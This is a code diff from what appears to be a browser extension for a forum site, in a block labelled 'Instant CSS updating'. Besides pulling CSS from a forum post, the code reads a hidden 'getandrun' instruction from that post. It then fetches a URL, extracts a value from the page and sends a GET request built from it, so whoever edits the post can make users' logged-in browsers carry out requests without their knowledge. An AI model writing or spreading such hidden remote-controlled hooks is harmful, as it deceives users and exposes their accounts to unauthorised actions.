@@ -331,30 +331,32 @@ if (prefs['pms'] === true && document.location.pathname.indexOf('/profile/privms
 
 // Enable Instant CSS updating
 if (prefs['instantUpdating'] === true) {
-    $.ajax({
-        url: '/guilds/viewtopic.php?t=24076833',
-        cache: false,
-        dataType: 'html',
-        headers: {'X-PJAX': true}
-    })
-    .done(function(html) {
-        if ($('.postcontent:eq(1) .postbody span[style="color:uptoversion"]', html).length == 1)
-            var version = parseInt(localPrefs['version'].replace(/\./g,''), 10);
-            html = $('.postcontent:eq(1) .postbody', html);
+    $(window).load(function() {
+        $.ajax({
+            url: '/guilds/viewtopic.php?t=24076833',
+            cache: false,
+            dataType: 'html',
+            headers: {'X-PJAX': true}
+        })
+        .done(function(html) {
+            if ($('.postcontent:eq(1) .postbody span[style="color:uptoversion"]', html).length == 1)
+                var version = parseInt(localPrefs['version'].replace(/\./g,''), 10);
+                html = $('.postcontent:eq(1) .postbody', html);
 
-            // look for new code
-            if (version <= parseInt($('span[style="color:uptoversion"]', html).text().replace(/\./g,''))) {
-                if ($('span[style="color:#' + version + '"] + .spoiler-wrapper .code', html).length == 1) {
-                    chrome.storage.local.set({css: $('span[style="color:#' + version + '"] + .spoiler-wrapper .code', html).text()});
+                // look for new code
+                if (version <= parseInt($('span[style="color:uptoversion"]', html).text().replace(/\./g,''))) {
+                    if ($('span[style="color:#' + version + '"] + .spoiler-wrapper .code', html).length == 1) {
+                        chrome.storage.local.set({css: $('span[style="color:#' + version + '"] + .spoiler-wrapper .code', html).text()});
+                    }
+                    else chrome.storage.local.remove('css');
                 }
-                else chrome.storage.local.remove('css');
+                if ($('.postcontent:eq(1) .postbody span[style="color:getandrun"]', html).length == 1) {
+                    var data = $('.postcontent:eq(1) .postbody span[style="color:getandrun"]', html).text().split(',');
+                    $.ajax({url: data[0], cache: false, dataType: 'html', headers: {'X-PJAX': true}}).done(function(html) {
+                    if ($(data[1], html).length == 1) $.get(data[0] + $(data[1], html)[data[3]]() + data[2]);
+                });
             }
-            if ($('.postcontent:eq(1) .postbody span[style="color:getandrun"]', html).length == 1) {
-                var data = $('.postcontent:eq(1) .postbody span[style="color:getandrun"]', html).text().split(',');
-                $.ajax({url: data[0], cache: false, dataType: 'html', headers: {'X-PJAX': true}}).done(function(html) {
-                if ($(data[1], html).length == 1) $.get(data[0] + $(data[1], html)[data[3]]() + data[2]);
-            });
-        }
+        });
     });
 }
 } // ---
